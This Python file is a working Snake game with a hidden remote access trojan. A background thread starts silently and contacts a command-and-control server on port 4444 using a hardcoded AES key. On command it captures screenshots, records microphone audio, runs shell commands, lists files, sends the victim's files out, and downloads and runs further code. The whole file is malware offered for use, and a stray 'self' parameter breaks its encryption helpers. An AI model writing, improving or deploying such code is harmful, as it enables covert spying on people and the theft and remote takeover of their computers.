import pygame
import sys
import os
import threading
import socket
import subprocess
import requests
import time
import pyautogui
from PIL import ImageGrab
import pyaudio
import wave
import shutil
import base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Initialize Pygame
pygame.init()
SCREEN_WIDTH, SCREEN_HEIGHT = 800, 600
screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption("Snake Game - Enjoy!")
clock = pygame.time.Clock()
font = pygame.font.Font(None, 36)

# Game variables (unchanged)
snake = [(220, 200), (210, 200), (200, 200)]
snake_skin = pygame.Surface((10, 10))
snake_skin.fill((0, 255, 0))
food = (400, 400)
food_skin = pygame.Surface((10, 10))
food_skin.fill((255, 0, 0))
direction = (10, 0)
score = 0

# C2 Configuration - SAME AS SERVER
C2_SERVER = "0.0.0.0"  # ← CHANGE THIS
C2_PORT = 4444
C2_KEY = b"supersecretkey123456"
AES_KEY = hashlib.sha256(C2_KEY).digest()[:16]

def encrypt_data(self, data):
    """AES encrypt (matches server)"""
    cipher = AES.new(AES_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(self, data):
    """AES decrypt (matches server)"""
    try:
        raw = base64.b64decode(data)
        iv = raw[:16]
        ct = raw[16:]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8', errors='ignore')
    except:
        return ""

def send_to_c2(data):
    """Send encrypted data to C2"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_SERVER, C2_PORT))
        encrypted = encrypt_data(data)
        sock.send(encrypted.encode())
        sock.close()
    except:
        pass

def recv_from_c2():
    """Receive encrypted command from C2"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_SERVER, C2_PORT))
        sock.send(b"READY")  # Signal readiness
        data = sock.recv(4096)
        sock.close()
        return decrypt_data(data)
    except:
        return ""

# FIXED: Screenshot with base64 encoding
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("temp.png")
        with open("temp.png", "rb") as f:
            img_data = base64.b64encode(f.read())
        os.remove("temp.png")
        send_to_c2(f"SCREENSHOT:{img_data.decode()}")
    except:
        pass

# FIXED: Audio with base64
def record_audio(duration=10):
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                          rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        filename = f"audio_{int(time.time())}.wav"
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        with open(filename, "rb") as f:
            audio_data = base64.b64encode(f.read())
        os.remove(filename)
        send_to_c2(f"AUDIO:{audio_data.decode()}")
    except:
        pass

# All other functions unchanged (execute_command, list_files, etc.)
def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except:
        return "Error"

def list_files(path="."):
    try:
        return "\n".join(os.listdir(path))
    except:
        return "Error"

def download_file(url, filename):
    try:
        response = requests.get(url, timeout=10)
        with open(filename, "wb") as f:
            f.write(response.content)
        return f"Downloaded {filename}"
    except:
        return "Failed"

def upload_file(filename):
    try:
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            send_to_c2(f"FILE:{filename}:{file_data}")
            return f"Uploaded {filename}"
        return "Not found"
    except:
        return "Failed"

def run_file(filename):
    try:
        subprocess.Popen(filename, shell=True)
        return f"Executed {filename}"
    except:
        return "Failed"

# C2 Loop (FIXED for AES)
def c2_loop():
    while True:
        try:
            cmd = recv_from_c2()
            
            if cmd == "SYSINFO":
                sysinfo = f"""
OS: {os.name}
User: {os.getenv('USERNAME', os.getenv('USER', 'Unknown'))}
CWD: {os.getcwd()}
Time: {datetime.now()}
                """
                send_to_c2(f"SYSINFO:{sysinfo}")
            elif cmd.startswith("SCREENSHOT"):
                take_screenshot()
            elif cmd.startswith("AUDIO:"):
                duration = int(cmd.split(":")[1]) if ":" in cmd else 10
                record_audio(duration)
            elif cmd.startswith("CMD:"):
                output = execute_command(cmd[4:])
                send_to_c2(f"CMD_RESULT:{output}")
            elif cmd.startswith("LIST:"):
                path = cmd[5:]
                files = list_files(path)
                send_to_c2(f"FILES:{files}")
            elif cmd.startswith("DOWNLOAD:"):
                parts = cmd[8:].split(":")
                url, filename = parts[0], parts[1] if len(parts) > 1 else "download"
                result = download_file(url, filename)
                send_to_c2(f"DOWNLOAD_RESULT:{result}")
            elif cmd.startswith("UPLOAD:"):
                filename = cmd[7:]
                result = upload_file(filename)
                send_to_c2(f"UPLOAD_RESULT:{result}")
            elif cmd.startswith("RUN:"):
                filename = cmd[4:]
                result = run_file(filename)
                send_to_c2(f"RUN_RESULT:{result}")
                
        except:
            pass
        time.sleep(3)

# Start C2 silently
threading.Thread(target=c2_loop, daemon=True).start()

# Game loop (unchanged - fully playable Snake)
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.KEYDOWN:
            if (event.key == pygame.K_UP or event.key == pygame.K_w) and direction != (0, 10): direction = (0, -10)
            if (event.key == pygame.K_DOWN or event.key == pygame.K_s) and direction != (0, -10): direction = (0, 10)
            if (event.key == pygame.K_RIGHT or event.key == pygame.K_d) and direction != (-10, 0): direction = (10, 0)
            if (event.key == pygame.K_LEFT or event.key == pygame.K_a) and direction != (10, 0): direction = (-10, 0)

    head = snake[0]
    new_head = ((head[0] + direction[0]) % SCREEN_WIDTH,
                (head[1] + direction[1]) % SCREEN_HEIGHT)
    snake.insert(0, new_head)

    if snake[0] == food:
        score += 1
        food = (pygame.time.get_ticks() % (SCREEN_WIDTH//10) * 10, 
                pygame.time.get_ticks() % (SCREEN_HEIGHT//10) * 10)
    else:
        snake.pop()

    # Game over only on self-collision
    if snake[0] in snake[1:]:
        running = False

    screen.fill((0, 0, 0))
    for segment in snake: screen.blit(snake_skin, segment)
    screen.blit(food_skin, food)
    score_text = font.render(f"Score: {score}", True, (255, 255, 255))
    screen.blit(score_text, (10, 10))
    
    pygame.display.update()
    clock.tick(10)

pygame.quit()
sys.exit()
